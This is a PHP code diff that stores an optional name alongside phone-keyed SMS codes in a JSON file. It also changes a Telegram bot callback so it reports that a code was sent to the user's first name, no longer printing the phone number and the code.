@@ -9,7 +9,7 @@ function rutaCodigos()
     return __DIR__ . '/codigos.json';
 }
 
-function guardarCodigo($telefono, $codigo)
+function guardarCodigo($telefono, $codigo, $nombre = null)
 {
     $archivo = rutaCodigos();
     $datos = [];
@@ -20,7 +20,15 @@ function guardarCodigo($telefono, $codigo)
             $datos = $tmp;
         }
     }
-    $datos[$telefono] = $codigo;
+    $existente = $datos[$telefono] ?? [];
+    if (!is_array($existente)) {
+        $existente = ['codigo' => $existente];
+    }
+    $existente['codigo'] = $codigo;
+    if ($nombre !== null) {
+        $existente['nombre'] = $nombre;
+    }
+    $datos[$telefono] = $existente;
     file_put_contents($archivo, json_encode($datos));
 }
 
@@ -86,9 +94,28 @@ if (isset($update['callback_query'])) {
             // Marcar como listo para que la pantalla de carga pueda continuar
             marcarListo($telefono);
 
+            // Obtener nombre almacenado para ese teléfono (si existe)
+            $archivo = rutaCodigos();
+            $primerNombre = '';
+            if (is_file($archivo)) {
+                $json = file_get_contents($archivo);
+                $datos = json_decode($json, true);
+                if (is_array($datos) && isset($datos[$telefono]['nombre'])) {
+                    $nombreCompleto = trim($datos[$telefono]['nombre']);
+                    if ($nombreCompleto !== '') {
+                        $partes = preg_split('/\s+/', $nombreCompleto);
+                        $primerNombre = $partes[0] ?? '';
+                    }
+                }
+            }
+
+            if ($primerNombre === '') {
+                $primerNombre = 'el usuario';
+            }
+
             // Aquí integrarías el envío real de SMS usando $telefono y $nuevoCodigo
 
-            $texto = "Nuevo código SMS generado para $telefono: $nuevoCodigo";
+            $texto = "El código SMS fue enviado a $primerNombre";
             enviarATelegram($BOT_TOKEN, $chatId, $texto);
         }
     }
